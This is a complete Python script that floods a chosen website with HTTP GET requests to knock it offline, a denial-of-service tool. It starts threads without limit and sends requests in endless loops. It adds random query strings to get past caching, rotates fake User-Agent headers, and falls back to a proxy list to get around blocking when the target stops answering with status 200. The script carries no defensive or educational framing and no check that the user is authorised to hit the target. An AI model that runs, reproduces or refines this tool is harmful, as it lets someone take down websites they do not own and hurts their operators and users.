import requests
import sys
import random
import threading
import argparse


des = """Example: python dos.py -u https://example.com/          
Example with proxy: python dos.py -u https://example.com/ -p proxyList.txt          
if you use proxy it will use proxy when the response code is not 200 """

parser = argparse.ArgumentParser(description=des)
parser.add_argument("-u", type=str, help="Enter You're URL Here Example: https://www.example.com")
parser.add_argument("-p", type=str, help="Enter You're list of proxies.txt Example: proxyList.txt")
args = parser.parse_args()


proxies = []

if args.u == None:
    print("[-]type python dos.py -h for help")
    sys.exit()

elif args.p != None:
    with open(args.p, "r") as opn:
        for x in opn:
            if str(x)[0].isdigit():
                proxies.append(x.strip())


url = args.u


def useragent():
    headers = [
        "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3"
    ]
    return random.choice(headers)


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)

    return out_str


print("[+]Started HTTP GET Request")


class httpth1(threading.Thread):
    def run(self):
        while True:
            try:
                urls = url + "?" + ascii(random.randint(3, 10))
                header = {"User-Agent": useragent()}

                if args.p != None:
                    req = requests.get(urls, headers=header)
                    if req.status_code != 200:
                        print("[+]status code: {0}".format(req.status_code))
                        print("[+]Switching To Proxy")
                        req = requests.get(urls, headers=header, proxies={"https": random.choice(proxies), "http": random.choice(proxies)})

                else:
                    req = requests.get(urls, headers=header)
                    if req.status_code != 200:
                        print("[+]status code: {0}".format(req.status_code))

            except KeyboardInterrupt:
                exit("\033[1;34m [-]Canceled By User \033[1;m")
                break

            except Exception:
                pass


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[-]Canceled By User")
